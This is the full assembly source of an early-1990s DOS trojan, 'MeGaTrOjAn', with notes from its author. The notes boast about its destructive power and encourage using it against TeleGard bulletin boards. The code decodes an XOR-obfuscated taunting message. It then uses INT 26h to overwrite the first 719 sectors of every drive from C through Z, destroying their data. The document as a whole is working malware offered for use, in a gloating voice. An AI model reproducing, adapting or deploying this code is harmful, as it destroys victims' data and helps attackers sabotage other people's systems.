;******************************************************************************
;                     The High Evolutionary's [MeGaTrOjAn] v1.0
;******************************************************************************
;
; Development Notes: (Dec.12.9O)
; ------------------------------
;
; Hi guys. It's me again. Here is my latest work of Trojanic Art. This does
; alot more damage than my old Trojan (Int 13 method). This one uses INT 26
; instead that overwrites 719 sectors of each hard-drive.
;
; I managed to fix the error on crashing after INT 26. The problem lied in
; the restoration of the flags after the INT was called.
;
; I also have an encrypted message in this one. Rather nice if I do say so
; myself. Check out the commented lines to read the message.
; (It gets written to sector 0 of each drive. Do view it, use NU /M)
;
; I also fixed a small bug in my old encryption routine. Check out this source
; for the latest modifications and fixes, but it works great now...
;
; Have phun...
;
;  -= The High Evolutionary =-
;
; PS: Use this to crash those lame-ass TeleGard Boards...
;
;******************************************************************************
;                       Written by The High Evolutionary
;
;                Property of The RABID Nat'nl Development Corp.
;
;           NOT TO BE DISTRIBUTED TO ANY OUTSIDE GROUPS OR AGENCIES
;    (Well, at least the source code. I don't give a fuck what you do with
;                            the compiled file...)
;******************************************************************************





code    segment
    assume  cs:code,ds:code,es:code
    org     100h

@fry    macro   drive,sectors
    pushf                                   ; Push all flags onto the stack
    mov     al,drive                        ; Select drive to fry
    mov     cx,sectors                      ; Choose amount of sectors
    mov     dx,0                            ; Set format to start at sec. 0
    mov     bx,offset dest                  ; Set format to have IDENT
                        ; string imbedded in sector 0
    int     26h                             ; Call BIOS to fry drive
    popf                                    ; Restore the flags we pushed
endm    

start:  jmp     decrypt

;
; BAHA! Rather sympathetic message eh guys?
;

;ident  db      "Ooops! Looks like you have a slight problem. This drive ",13,10
;       db      "is fried! Why? Well, that's easy... RABID''s the answer... ",13,10
;       db      "Your security sucks shit!!! Time to upgrade... Let me ",13,10
;       db      "give you a little hint to speed up your recovery. Reformat ",13,10
;       db      "your hard-drive. MIRROR, SF and any other nifty utils are ",13,10
;       db      "useless against RABID''s [MeGaTrOjAn]... Have phun guys! ",13,10
;       db      "                   - RABID '91",13,10

ident   db      "Nnnqr !Mnnjr!mhjd!xnt!i`wd!`!rmhfiu!qsncmdl/!Uihr!eshwd!h"
    db      "r!gshde !Vix>!Vdmm-!ui`u&r!d`rx///!S@CHE&r!uid!`orvds///!"
    db      "Xnts!rdbtshux!rtbjr!rihu   !Uhld!un!tqfs`ed///!Mdu!ld!fhw"
    db      "d!xnt!`!mhuumd!ihou!un!rqdde!tq!xnts!sdbnwdsx/!Sdgnsl`u!x"
    db      "nts!i`se,eshwd/!LHSSNS-!RG-!`oe!`ox!nuids!ohgux!tuhmr!`sd!"
    db      "trdmdrr!`f`horu!S@CHE&r!ZLdF`UsNk@o\///!I`wd!qito!ftxr !"
    db      "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!,!S@CHE!&80"

lident  equ     $-ident                         ; Find the length of string

dest    db      [lident-1/2] dup (?)            ; Blank field for decrypt

temp    db      0                               ; Temp char field

haha    db      2                               ; HAHA is the drive to be
                        ; nuked!

hoho    dw      719                             ; HOHO is the number of sectors
                        ; to make into Kaka!
;
; (Can't you tell I'm in the Christmas Spirit...)
;

decrypt:
    mov     cx,lident                       ; Move length of string
                        ; into CX
    mov     si,offset ident                 ; Move string into SI
    mov     di,offset dest                  ; Specify dest in DI
doshit: mov     al,ds:[si]                      ; Get a charachter
    mov     temp,al                         ; Copy it to temp
    xor     byte ptr ds:[temp],01h          ; XOR it with 01h
    mov     al,temp                         ; Copy temp to AL
    mov     [di],al                         ; Copy AL into dest
    inc     si                              ; Inc SI
    inc     di                              ; Inc DI
    loop    doshit                          ; Back for the next charachter
                        ; until CX=0

main:   cmp     haha,27                         ; Check to see if drive Z is
                        ; fried
    jge     quit                            ; If yeah. Then gedoudahere
    @fry    haha,hoho                       ; No? Then fry the drive...
    inc     haha                            ; Add 1 to HAHA
    jmp     main                            ; Then go up and fry another

quit:   mov     ax,4c00h                        ; Set terminate program with
                        ; error code 00
    int     21h                             ; Call DOS to gedoudahere
    
    code    ends

end     start